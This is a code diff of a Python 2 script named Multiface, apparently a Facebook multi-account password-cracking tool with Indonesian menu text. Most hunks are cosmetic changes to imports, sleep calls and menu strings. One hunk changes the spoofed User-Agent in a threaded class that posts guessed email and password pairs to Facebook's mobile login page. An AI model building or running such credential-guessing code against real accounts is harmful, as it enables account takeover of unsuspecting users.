@@ -4,7 +4,8 @@
 # Mod by Nedi Senja
 # Github: https://github.com/stepbystepexe/Multiface
 
-import platform, os, sys, cookielib, re, urllib2, urllib, threading, time, random
+import os, sys, time, random, platform, cookielib, re, urllib2, urllib, threading
+from time import sleep
 from mechanize import Browser
 
 info = """
@@ -72,7 +73,7 @@ class pesbuk(threading.Thread):
                 return self.o,self.id
         def run(self):
                 try:
-                        data = urllib2.urlopen(urllib2.Request(url='https://m.facebook.com/login.php',data=urllib.urlencode({'email':self.id,'pass':self.f}),headers={'User-Agent':'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16'}))
+                        data = urllib2.urlopen(urllib2.Request(url='https://m.facebook.com/login.php',data=urllib.urlencode({'email':self.id,'pass':self.f}),headers={'User-Agent':'Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.4 Chrome/67.0.3396.87 Mobile Safari/537.36'}))
                 except KeyboardInterrupt:
                         sys.exit(1)
                 except:
@@ -384,7 +385,7 @@ def menu():
                 idfriend()
         elif x == 3:
                 print ("\n\033[0m[\033[1;91m!\033[0m] \033[1;77mKeluar dari program!\n")
-                time.sleep(1)
+                sleep(1)
                 sys.exit(1)
 
 def restart():
@@ -394,19 +395,19 @@ def restart():
 
 os.system('clear')
 os.system('reset')
-time.sleep(1)
+sleep(1)
 print
 print(logo)
 print
-print("\033[0m[\033[1;96mあ\033[0m] \033[1;77mMulai Menggunakan Multiface")
+print("\033[0m[\033[1;96;2m1\033[0m] \033[1;77mFacebook Multiface")
 print
 print("\033[0m[\033[93;1m&\033[0m] LISENSI")
 print("\033[0m[\033[94;1m#\033[0m] Informasi")
 print("\033[0m[\033[92;1m*\033[0m] Perbarui")
 print("\033[0m[\033[91;1m-\033[0m] Keluar")
 print
-option = raw_input("\033[0m[\033[1;95m/\033[0m] \033[1;77mMasukan opsi: \033[0m")
-if option.strip() in 'あ 1 gunakan'.split():
+option = raw_input("\033[0m(\033[105;77;1m/\033[0m) \033[1;77mMasukan opsi: \033[0m")
+if option.strip() in '1 gunakan'.split():
     menu()
 elif option.strip() in '& 2 lisensi'.split():
     print
@@ -418,7 +419,7 @@ elif option.strip() in '# 3 info'.split():
     print(example)
     os.system('toilet -f smslant Multi')
     print(info)
-    time.sleep(1)
+    sleep(1)
     print
     raw_input('[ Tekan Enter ]')
     restart()
@@ -435,7 +436,7 @@ elif option.strip() in '- keluar 0'.split():
 else:
     print("\n\033[0m[=\033[1;41;77m Pilihan Salah \033[0m=]")
     print
-    time.sleep(1)
+    sleep(1)
     restart()
 
 datacount()
